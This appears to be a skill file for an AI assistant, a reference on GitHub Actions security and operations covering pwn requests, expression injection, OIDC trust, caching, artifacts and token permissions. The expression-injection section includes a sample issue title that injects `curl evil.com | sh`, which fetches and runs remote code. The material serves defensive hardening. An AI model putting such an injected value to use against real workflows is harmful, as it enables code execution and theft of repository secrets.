---
name: github-actions
description: >
  Deep GitHub Actions operational intuition — concurrency groups, OIDC federation
  (AWS/GCP/Azure), matrix include/exclude semantics, composite vs reusable workflow
  distinctions, cache scope rules, runner image versioning, expression injection,
  pull_request_target footguns, and v4 artifact/cache breaking changes.
  Load ONLY when the task is about workflow operational gotchas, security hardening,
  trigger semantics, OIDC setup, cache/artifact behavior, runner-image pinning, or
  reusable-vs-composite design choices. Do NOT load for first-time "write me a CI
  workflow" YAML — basic step composition does not need this skill.
  Triggers on: "pull_request_target", "pwn request", "expression injection",
  "OIDC trust", "workload identity", "concurrency group", "cancel-in-progress",
  "matrix include exclude", "fail-fast", "reusable workflow", "composite action",
  "secrets inherit", "actions/cache v4", "actions/upload-artifact v4",
  "ubuntu-latest pin", "self-hosted runner ephemeral", "GITHUB_TOKEN permissions",
  "id-token write", "workflow_run trigger", "schedule cron drift",
  "hashFiles restore-keys", "add-mask", "fork PR secrets".
---

# GitHub Actions Operational Guide

Concise pointers for deep GitHub Actions troubleshooting, hardening, and design.

Assumes you already know workflow YAML, jobs/steps, and how to read a run log. This skill covers the **operational layer** — the parts models gloss over: trigger-context security, OIDC federation, matrix edge cases, cache scope, version-introduced breaking changes, and the security footguns that cause repo compromise.

## When to use

Load when the question is about:
- `pull_request_target` / `workflow_run` / fork-PR secret leakage / pwn requests
- Expression injection (`${{ github.event.* }}` in `run:` blocks)
- OIDC trust setup for AWS / GCP / Azure (cloud creds without long-lived secrets)
- Concurrency groups, cancel-in-progress semantics, queued-runs behavior
- Matrix `include`/`exclude` edge cases, `fail-fast`, `max-parallel`
- Composite action vs reusable workflow design choice
- Cache scope (default-branch fallback, PR merge-ref isolation, cross-OS keys)
- Artifact v4 / cache v4 breaking changes (immutability, separate save/restore)
- Runner image pinning (`ubuntu-latest` rollover) and deprecation timing
- `GITHUB_TOKEN` permissions hardening
- Self-hosted runner security (ephemeral, ARC, JIT)

**Do NOT load** for: writing a basic `on: push` workflow, choosing `runs-on: ubuntu-latest` first time, "what is a job", how to call an action from marketplace — those don't need this skill.

## Trigger security: pull_request vs pull_request_target

- **`pull_request`** runs from the PR's merge ref (`refs/pull/N/merge`); for PRs from forks, secrets are stripped and `GITHUB_TOKEN` is read-only by default. Forked code is sandboxed. Safe to checkout PR head.
- **`pull_request_target`** runs from the **base branch** workflow file with **write** `GITHUB_TOKEN` and **full secrets**. As of late 2025, the workflow file is **always** sourced from the default branch regardless of PR base.
- **The pwn-request pattern**: `pull_request_target` + `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` followed by any build/install step (`npm install`, `make`, `pytest`) → arbitrary code execution with write token + secrets in memory. npm's `preinstall`/`postinstall` lifecycle scripts are a common exfiltration channel.
- **Safe pattern when you must touch PR content**: two-workflow split. `pull_request` builds in isolation and uploads an artifact. `workflow_run` (after the first completes) runs in trusted context, downloads artifact, validates, then operates. Always unzip artifacts to `/tmp` and validate before consuming — artifact poisoning is a documented attack.
- **`workflow_run`** runs against the default branch's workflow file but `github.event.workflow_run.head_*` reflects the upstream trigger. Filter via `if: github.event.workflow_run.event == 'pull_request' && github.event.workflow_run.conclusion == 'success'`.

## Expression injection

- `run: echo "${{ github.event.issue.title }}"` is direct shell-template substitution — not parameter passing. Title `z"; curl evil.com | sh; #` becomes inline script.
- Attacker-controlled fields: issue/PR title and body, comment body, branch name, commit message (first line is `github.event.head_commit.message`), email address, label names.
- **Mitigation**: assign to env, reference via `$VAR` (so the shell handles it as a string, not script):
  ```yaml
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
  ```
- Same applies to `actions/github-script` `script:` field and any place expression syntax expands into an interpreter.
- Detect with the `script_injections.ql` CodeQL pack from GitHub Security Lab.

## OIDC federation (no long-lived cloud secrets)

- **Required permission** at workflow or job: `permissions: { id-token: write, contents: read }`. Without `id-token: write`, the runner cannot mint the OIDC JWT.
- **Subject claim formats** (the `sub` field cloud trust policies key on):
  - `repo:OWNER/REPO:ref:refs/heads/BRANCH` — branch-scoped
  - `repo:OWNER/REPO:environment:NAME` — environment-scoped (only when job declares `environment:`)
  - `repo:OWNER/REPO:pull_request` — PR-scoped (forked-PR token has reduced scope)
  - `repo:OWNER/REPO:ref:refs/tags/TAG` — tag-scoped
- **Trust policy must constrain `sub`**. `StringLike: token.actions.githubusercontent.com:sub: repo:OWNER/REPO:*` is the **minimum acceptable** — without it, ANY repo could assume the role. Prefer `StringEquals` against a specific ref/environment.
- **AWS**: `aws-actions/configure-aws-credentials@v4` with `role-to-assume` (ARN) + `aws-region`. Audience defaults to `sts.amazonaws.com`. Calls `AssumeRoleWithWebIdentity`.
- **GCP**: `google-github-actions/auth@v2` with `workload_identity_provider` (full resource path: `projects/N/locations/global/workloadIdentityPools/POOL/providers/PROVIDER`) + `service_account` (email). Direct WIF (no service account) is preferred.
- **Azure**: `azure/login@v2` with `client-id` + `tenant-id` + `subscription-id`. Set up federated credential on the service principal or user-assigned managed identity, with issuer `https://token.actions.githubusercontent.com`.
- **Custom claims** (org-scoped): repo properties prefixed `repo_property_*` can be added to the JWT for fine-grained policies.

## Concurrency

- Workflow-level `concurrency: { group: "${{ github.workflow }}-${{ github.ref }}", cancel-in-progress: true }` — group is an evaluated expression; one run in-flight per group, new run cancels the prior.
- `cancel-in-progress: false` (default) **queues** instead of cancelling. **Only ONE queued** run is retained — additional triggers replace the queued one (the in-flight run continues unaffected).
- Job-level `concurrency:` for finer-grained per-deploy serialization (e.g., one production deploy at a time across all branches: `group: deploy-prod`).
- Common pattern for deploys: `cancel-in-progress: false` + group on environment to serialize without losing runs.
- Concurrency groups do not span repos or workflows unless you make the group key match.

## Matrix semantics

- `strategy.matrix.OS: [ubuntu, macos]` × `node: [18, 20]` produces the cross product (4 jobs).
- **`include:`** has two distinct behaviors:
  1. If every original-key field in the include entry matches an existing combination, the entry **adds extra fields** to that combination (no new job).
  2. If any field does not match an original key/value, the entry **adds a brand-new combination**.
- **`exclude:`** removes combinations matching all listed keys. Exclude evaluates **before** include.
- **`fail-fast`** defaults to `true` — one failed matrix job cancels all in-progress + queued. Set `fail-fast: false` to see all failures (the standard for cross-platform/cross-version test matrices).
- **`max-parallel`** caps simultaneous matrix jobs (the rest queue).
- **Hard cap**: 256 jobs per matrix per workflow run.
- **Matrix outputs collapse**: if multiple matrix jobs write `outputs.X`, the last writer wins. Use unique output names (`outputs.${{ matrix.os }}_result`) or write to artifacts.

## Composite actions vs reusable workflows

- **Composite action** (`action.yml`, `runs.using: composite`, `runs.steps: [...]`):
  - Runs as a sequence of steps **inside the calling job** on the caller's runner
  - Cannot access caller secrets unless explicitly passed as `inputs:` (no `secrets: inherit`)
  - Can call other actions; can use `shell:` per step
  - No `runs-on:` — inherits from caller
- **Reusable workflow** (`.github/workflows/X.yml`, `on: workflow_call`):
  - Called via `jobs.<id>.uses: ./.github/workflows/X.yml@SHA` (same repo) or `OWNER/REPO/.github/workflows/X.yml@REF` (cross-repo)
  - Runs as **separate job(s)** on its own runner — distinct from caller
  - `secrets: inherit` passes all caller secrets implicitly (only within same org/enterprise)
  - **Environment secrets cannot pass through** — `workflow_call` does not support `environment:` at the trigger level
  - Max **10 levels** of nesting (top caller + 9 reusables); loops forbidden
- Pick composite when you need to splice steps into an existing job (e.g., setup-language wrapper). Pick reusable when you want a separately-scheduled, environment-gated job.

## Caching (`actions/cache@v4`)

- **`key:`** is exact. **`restore-keys:`** is an ordered list of **prefixes** to fall back to.
- **Lookup order**: exact `key` in current branch → `key` prefix-match in current branch → `restore-keys` prefixes in current branch → repeat all three on **default branch**. PR-merge-ref caches are isolated to that PR's re-runs only.
- **Scope rules**:
  - Default-branch caches are visible to feature branches (write to `main`, read from anywhere).
  - Feature-branch caches are NOT visible to `main` or sibling branches.
  - For PRs, also visible: caches from the **base branch** (including across forks).
- **Cross-OS caches not interchangeable** by default. Always include `${{ runner.os }}` in the key, or set `enableCrossOsArchive: true` (opt-in, Windows-originated only).
- **Limits**: 10 GB per repo, LRU eviction, **7-day inactive eviction** regardless of size.
- **v4 split**: `actions/cache/restore@v4` and `actions/cache/save@v4` are separate. Lets you save conditionally (e.g., only on cache miss + successful build) instead of the implicit POST step writeback in v3.
- **Common mistake**: caching `node_modules` instead of `~/.npm`. The latter restores faster because npm reuses unpacked content. For Yarn, cache `~/.cache/yarn`.

## Artifacts (`actions/upload-artifact@v4` / `download-artifact@v4`)

- v4 is **immutable per-name within a workflow run** — uploading to the same name twice **fails** rather than merging. Each artifact is now individually addressable via the API immediately after upload.
- v4 is **incompatible with v3** — you cannot mix versions across upload and download.
- **No automatic merge across jobs**. To combine: upload with distinct names (`logs-${{ matrix.os }}`), then `actions/download-artifact@v4` with `pattern:` + `merge-multiple: true`, OR use `actions/upload-artifact/merge@v4` after the matrix completes.
- 500 artifacts per job cap.
- `retention-days:` overrides the repo default (90 days max).

## Runner images and pinning

- `ubuntu-latest` is `ubuntu-24.04` as of late 2024 (was 22.04 prior). The label rolls automatically over a ~1-2 month window after a new GA. **For reproducibility, pin** to `ubuntu-24.04` explicitly.
- Active GA images: at most **2 GA + 1 beta** per OS family. Old images get a deprecation notice + scheduled brownouts (failing runs at intervals) before final removal.
- Image changelog at `github.com/actions/runner-images` lists package versions per image — diff before/after rollover when "it works locally / breaks in CI."
- `windows-latest` and `macos-latest` follow the same rollover pattern; macOS lags Apple GA by ~6 months.

## Self-hosted runners

- **Persistent runner** (default `config.sh`): retains workspace + state between jobs. Compromise of one job exposes secrets, env vars, and disk artifacts to **next** job. Avoid for public repos.
- **Ephemeral runner** (`config.sh --ephemeral`): processes exactly one job, then auto-deregisters. Required for any runner exposed to fork PRs.
- **JIT registration**: REST `POST /repos/{o}/{r}/actions/runners/generate-jitconfig` returns a single-use config token; runner registers, runs one job, exits. Stateless by construction.
- **ARC (Actions Runner Controller)** for k8s: scale sets, JIT, autoscaling. The reference implementation; recommended over the legacy controller.
- **Job assignment race**: a runner shutting down may still receive a job. Ephemeral + JIT is the only fully-safe model.

## GITHUB_TOKEN permissions

- Default scopes are org-policy controlled: either **permissive** (read+write across most categories) or **restricted** (`contents: read` only, all else `none`). Check Settings → Actions → Workflow permissions.
- Override per-workflow or per-job with the `permissions:` key. Listing any scope sets all unlisted scopes to `none`. Use `permissions: {}` to drop all (token still authenticates as the workflow but has no scopes).
- Common scopes: `contents`, `pull-requests`, `issues`, `id-token`, `packages`, `pages`, `deployments`, `actions`, `checks`, `statuses`, `security-events`. Each: `read`, `write`, or `none`.
- `id-token: write` is mandatory for OIDC JWT minting.
- The `GITHUB_TOKEN` is rate-limited at 1,000 req/hour per repo (15,000 on Enterprise Cloud). Bulk operations may exhaust this — use a PAT or GitHub App for those.

## Secrets, variables, and masking

- **Secrets** are masked one-way in logs (any matching substring becomes `***`). **Variables** are not.
- Scopes: organization > environment > repository. Environment secrets are **only available** to jobs that declare `environment: NAME`.
- `${{ secrets.X }}` and `${{ vars.X }}` evaluate **server-side** before the runner sees them; logs of the rendered YAML never contain the value.
- **Mask runtime values**: `echo "::add-mask::$VALUE"`. Run **before** any `echo $VALUE`. Calling `add-mask` directly on a `${{ }}` interpolation in the same step still leaks because the expression resolves before the masker activates — assign to env first, then mask the env var.
- Multi-line masking: each line must be masked individually, or all lines fed through a single masked variable.
- Outputs cannot be set to a masked value (the runner refuses to expose them).

## Environments and protection rules

- `environment: NAME` on a job gates execution behind protection rules.
- **Required reviewers**: up to **6** people/teams. Only one needs to approve.
- **Wait timer**: minutes value, no documented hard cap (formerly capped at 30 days).
- **Deployment branches**: restrict which refs can deploy via patterns; alternative is "selected branches and tags" with explicit allowlist.
- Use environments for gated production deploys instead of `if: github.actor == 'X'` — actor checks are bypassable in some forked-PR contexts and offer no audit trail.

## Marketplace action security

- **Pin to commit SHA**, not tag — `actions/checkout@v4` becomes `actions/checkout@A1B2...`. Tags are mutable; a compromised maintainer can re-point `v4` silently. SHA pinning is the only immutable reference (would require SHA-1 collision to subvert).
- Dependabot's `package-ecosystem: github-actions` updater understands SHA pinning and proposes upgrades with the resolved tag in the PR body.
- The 2024-2025 `tj-actions/changed-files` and `reviewdog/action-setup` compromises propagated through tag re-points; SHA-pinned consumers were unaffected.
- For supply-chain hardening, `step-security/harden-runner` provides egress filtering and tampering detection on Linux runners.

## Triggers — non-obvious semantics

- `schedule: cron: "*/5 * * * *"` — minimum interval **5 minutes**. UTC timezone. Runs are **best-effort** and can skip during high load. Cron runs only on the default branch's workflow file.
- `workflow_dispatch.inputs.<name>.type`: `string`, `choice` (with `options:`), `boolean`, `number`, or `environment`. Inputs are accessible via `inputs.<name>` (not `github.event.inputs` in newer syntax — both work).
- `repository_dispatch` external trigger: `event_type` is the dispatcher's chosen string; `client_payload` exposed via `github.event.client_payload` (max 10 top-level properties, 65 KB).
- `push` and `pull_request` `paths:`/`paths-ignore:` use minimatch globs. `paths-ignore` runs before `paths`; if a file matches `paths-ignore`, the workflow is skipped even if it matches `paths`.
- `branches:` matches against the ref triggering the event — for `pull_request`, it's the **base** branch (target of the PR), not the head.

## Expressions — operational quick-ref

- Functions: `toJSON(v)`, `fromJSON(s)`, `hashFiles(glob)`, `contains(haystack, needle)`, `startsWith`, `endsWith`, `format("{0}-{1}", a, b)`, `join(array, sep)`. `hashFiles` glob is rooted at workspace; result is SHA-256.
- Status: `success()` (default if `if:` references a status), `failure()`, `cancelled()`, `always()`. `always()` runs even if cancelled — use it for cleanup, but it makes the workflow uncancellable from the UI for that step.
- Operators: `==`, `!=`, `<`, `<=`, `>`, `>=`, `&&`, `||`, `!`. String comparison is **case-insensitive**. `==` does loose type coercion to numbers.
- Falsy values: `false`, `0`, `-0`, `""`, `null`. Missing context fields evaluate to `null` (not error).
- Object filter `obj.*.field` returns array of `field` values across all entries.
- `if:` at the top level of a job/step accepts either bare expression or `${{ }}`-wrapped — both work, and combining causes parsing surprises with `&&`/`||` outside the braces.

## Limits (current values to plan around)

- Job execution: **6 hours** on GitHub-hosted runners; 5 days on self-hosted.
- Workflow run total time: **35 days** including queue + approvals.
- Matrix: **256** jobs/run.
- API: 1,000 req/hour for `GITHUB_TOKEN` per repo (15k Enterprise Cloud).
- Concurrent jobs: 20 (Free) / 40 (Pro) / 500 (Enterprise) total across the account; larger runners up to 1,000.
- Trigger rate: 1,500 events / 10 sec / repo before throttling; 500 workflow runs / 10 sec / repo before queue blocks new triggers.
- Artifacts: 500 per job. Cache: 10 GB per repo.

## Debugging

- Repository secret `ACTIONS_STEP_DEBUG=true` enables `::debug::` log output (per-step expression resolution, env vars).
- Repository secret `ACTIONS_RUNNER_DEBUG=true` enables runner internals (network, file I/O).
- Workflow commands: `::group::TITLE` / `::endgroup::` for collapsible blocks; `::error file=path,line=N::msg`, `::warning::`, `::notice::` create annotations attached to commits.
- Re-run with debug logging from UI: enables both above for one run only.
- `act` (nektos/act) for local execution: useful for fast iteration on logic, but cannot perfectly emulate runner images, OIDC, secrets behavior, or matrix scheduling. Treat its results as approximate.

## Authoritative references

**Official GitHub docs** (`docs.github.com/en/actions`):
- [Concurrency](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)
- [Matrix](https://docs.github.com/en/actions/using-jobs/using-a-matrix-for-your-jobs)
- [Reusable workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows)
- [OIDC overview](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
- [OIDC AWS](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services)
- [Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows)
- [Permissions / GITHUB_TOKEN](https://docs.github.com/en/actions/using-jobs/assigning-permissions-to-jobs)
- [Expressions](https://docs.github.com/en/actions/learn-github-actions/expressions)
- [Workflow commands (add-mask)](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands)
- [Actions limits](https://docs.github.com/en/actions/reference/actions-limits)

**Action repos**:
- [`actions/cache`](https://github.com/actions/cache) — scope rules in README
- [`actions/runner-images`](https://github.com/actions/runner-images) — image CHANGELOGs
- [`actions/upload-artifact`](https://github.com/actions/upload-artifact) — v4 migration notes
- [`aws-actions/configure-aws-credentials`](https://github.com/aws-actions/configure-aws-credentials)
- [`google-github-actions/auth`](https://github.com/google-github-actions/auth)
- [`Azure/login`](https://github.com/Azure/login)

**Security research**:
- [GitHub Security Lab — Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [GitHub Security Lab — Untrusted input / expression injection](https://securitylab.github.com/resources/github-actions-untrusted-input/)
- [Step Security blog](https://www.stepsecurity.io/blog) — supply-chain attacks, hardened-runner guidance

## Guardrails

Before recommending a workflow change that touches secrets, triggers, or write-scoped tokens:
1. Quote the exact trigger and `permissions:` scope being granted.
2. State whether the workflow consumes any attacker-controlled input (`github.event.*` from PR/issue/comment).
3. If `pull_request_target` or `workflow_run` is involved, verify there is no checkout-then-execute of PR-controlled content.
4. For OIDC, name the cloud `sub` constraint so the role cannot be assumed by other repos.

**Default tokens are too generous; never weaken `permissions:` to fix a 403 — fix the missing scope explicitly.**
